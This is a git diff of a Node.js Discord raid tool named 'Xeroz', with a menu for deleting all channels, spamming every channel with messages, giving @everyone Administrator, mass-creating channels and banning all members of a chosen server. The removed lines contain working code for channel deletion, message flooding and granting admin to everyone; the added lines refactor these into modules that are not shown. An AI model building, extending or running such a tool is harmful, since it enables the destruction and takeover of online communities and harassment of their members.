@@ -1,22 +1,11 @@
 console.clear();
 // IMPORTS
 require("dotenv").config();
-const { Client, GatewayIntentBits, DiscordjsError, disableValidators, PermissionsBitField  } = require('discord.js');
+const { ChannelType, Client, GatewayIntentBits, DiscordjsError, disableValidators, PermissionsBitField  } = require('discord.js');
 const consoleColour = require('gradient-string');
 const q = require('readline-sync');
-const open = require('open');
-const { spawn, exec, execFile } = require('child_process');
 const Token = q.question((consoleColour.mind) ("What's your Bot Token? ")); console.clear();
 
-
-const logo = [`
-					db    db d88888b d8888b.  .d88b.  d88888D 
-					'8b  d8' 88'     88  '8D .8P  Y8. YP  d8' 
-					 '8bd8'  88ooooo 88oobY' 88    88    d8'  
-					 .dPYb.  88~~~~~ 88'8b   88    88   d8'   
-					.8P  Y8. 88.     88 '88. '8b  d8'  d8' db 
-					YP    YP Y88888P 88   YD  'Y88P'  d88888P                                     
-`];
 
 // CREATING THE CLIENT
 const xeroz = new Client({
@@ -25,20 +14,48 @@ const xeroz = new Client({
 		GatewayIntentBits.GuildMessages,
 		GatewayIntentBits.MessageContent,
 		GatewayIntentBits.GuildMembers,
+		GatewayIntentBits.GuildWebhooks,
 	],
 });
+
+// OPTIONS  (1 - 4)
+
+const { DelChannels } = require('./Options/DelChannels'); //NUKER
+const { Admin } = require('./Options/AdminAll'); //ADMINALL
+const { WebSpam } = require('./Options/WebhookSpam'); // CHANNEL SPAM
+const { MassChannel } = require('./Options/MassChannel'); // CHANNEL CREATE SPAM
+const { Ban } = require('./Options/BanAll'); // CHANNEL CREATE SPAM
+
+function OptionsUI(){
+
+	const logo = [(consoleColour.mind)`
+					db    db d88888b d8888b.  .d88b.  d88888D 
+					'8b  d8' 88'     88  '8D .8P  Y8. YP  d8' 
+					 '8bd8'  88ooooo 88oobY' 88    88    d8'  
+					 .dPYb.  88~~~~~ 88'8b   88    88   d8'   
+					.8P  Y8. 88.     88 '88. '8b  d8'  d8' db 
+					YP    YP Y88888P 88   YD  'Y88P'  d88888P                                     
+	`];
+
+	let line1 = (consoleColour.mind)`\n\t\t\t\t[1] Del Channels\t\t[3] Admin All`
+	let line2 = (consoleColour.mind)`\n\t\t\t\t[2] Webhook Spam\t\t[4] Mass Channel`
+	let line3 = (consoleColour.mind)`\n\t\t\t\t[5] Ban All     \t\t[6] Role Delete`
+	console.log(`${logo} ${line1} ${line2} ${line3}`)
+}
+
+// console.log((consoleColour.mind)(logo),(consoleColour.mind)`\n\t\t\t\t[1] Nuke\t\t\t[3] Admin All\n\t\t\t\t[2] Webhook Spam\t\t[4] Channel Spam\n`);
 
 function MainScreen(){
 	console.clear();
 	process.title = ` ${xeroz.user.username} | Num Of Guilds: ${xeroz.guilds.cache.size}`;
-	console.log((consoleColour.mind)(logo),(consoleColour.mind)`\n\t\t\t\t\t\t\t[1] Nuke\n\t\t\t\t\t\t\t[2] Webhook Spam\n\t\t\t\t\t\t\t[3] Admin All\n`);
+	OptionsUI();
 }
 
 function sleep(ms) 
 {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
-
+//DelChannels
 async function Xeroz(){
 console.clear();
 	MainScreen();
@@ -47,83 +64,54 @@ console.clear();
 
 	if (option == "1") 
 	{
-		process.title = `${xeroz.user.username} | [1: NUKING]`;
-		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
-		const guild = xeroz.guilds.cache.get(GuildID);
-		const channels = guild.channels.cache;
-	  
-		if (!guild) 
-		{
-		  process.title = `${xeroz.user.username} | [ERROR]`;
-		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
-		   Xeroz();
-		} else 
-		{
-		  channels.forEach(async channel => 
-			{
-			console.log(consoleColour.mind("[Deleted] : ") + "Channel" +  channel.name);
-			channel.delete();
-			await sleep(2500);
-			Xeroz();
-		 	});
-		}
+        let guildId = q.question(consoleColour.mind("[Guild ID] : "));
+        DelChannels(guildId, xeroz);
+        await sleep(1500);
+        Xeroz();
 	}
-
+	//OPTION 2
 	if (option == "2") 
 	{
-		  process.title = `${xeroz.user.username} | [2: WEBHOOK SPAM]`;
-		  let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
-		  let Content = q.question(consoleColour.mind("[Message Content] : "));
-		  let Amount = q.question(consoleColour.mind("[Amount of messages] (Bot can get rate limited if too many messages need to be send!): "));
-		  const guild = xeroz.guilds.cache.get(GuildID);
-		  const channels = guild.channels.cache;
-		
-		  if (!guild) 
-		  {
-			process.title = `${xeroz.user.username} | [ERROR]`;
-			console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
-			 Xeroz();
-		  } else 
-		  {
-			channels.forEach(async channel => 
-			  {
-				let i = 0;
-				while (i < Amount)
-				{
-				channel.send(Content);
-				console.log(consoleColour.mind(`[${xeroz.user.username} Sent] : `) + `"${Content}" in "${channel.name}"`);
-				i++;
-				}
-				await sleep(1500);
-				Xeroz();
-			});
-		  }
+        let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
+        let Content = q.question(consoleColour.mind("[Message Content] : "));
+        let Amount = q.question(consoleColour.mind("[Amount of messages] (Bot can get rate limited if too many messages need to be send!): "));
+    
+        WebSpam(GuildID, Content, Amount, xeroz);
+        await sleep(1500);
+        Xeroz();
 	}
-
+	//OPTION 3
 	if (option == "3") 
 	{
-		process.title = `${xeroz.user.username} | [3: ADMINALL]`;
 		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
-		const guild = xeroz.guilds.cache.get(GuildID);
-		// const role = guild.roles.cache.find(r => r.name === "@everyone");
-	  
-		if (!guild) 
-		{
-		  process.title = `${xeroz.user.username} | [ERROR]`;
-		  console.log(consoleColour.mind("[Error] : ") + `Guild with ID ${GuildID} does not exist.`);
-		Xeroz();
-		} else 
-		{
+		
+        Admin(GuildID, xeroz)
+        await sleep(1500);
+        Xeroz();
+	}
+	//OPTION 4
+	if (option == "4")
+	{
 
-		guild.roles.everyone.setPermissions('Administrator')
-		.then(() =>console.log(consoleColour.mind(`[Admin] : `)+ `Role "@everyone" has been given Administrator permissions`))
-		.catch(error => {
-		console.error(error);
-		console.log(consoleColour.mind("[Error] : ") +'An error occurred while setting role permissions');
-		});
+		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
+		let name = q.question(consoleColour.mind("[Channel Name] : "));
+		let amount = q.question(consoleColour.mind("[Amount of channels] : "));
+		
+		MassChannel(GuildID, name, amount, xeroz);
 		await sleep(1500);
-		Xeroz()
-		}
+		Xeroz();
+
+	}
+
+	if (option == "5")
+	{
+
+		let GuildID = q.question(consoleColour.mind("[Guild ID] : "));
+		
+		Ban(GuildID, xeroz);
+		await sleep(1500);
+		Xeroz();
+
 	}
 
 	else
@@ -147,3 +135,13 @@ async function Login(){
 xeroz.on("ready", async () => Xeroz());
 
 Login();
+
+/*
+ ooooooo  ooooo
+  `8888    d8'
+    Y888..8P     .ooooo.  oooo d8b  .ooooo.    oooooooo
+     `8888'     d88' `88b `888""8P d88' `88b  d'""7d8P
+    .8PY888.    888ooo888  888     888   888    .d8P'
+   d8'  `888b   888    .o  888     888   888  .d8P'  .P
+ o888o  o88888o `Y8bod8P' d888b    `Y8bod8P' d8888888P
+*/
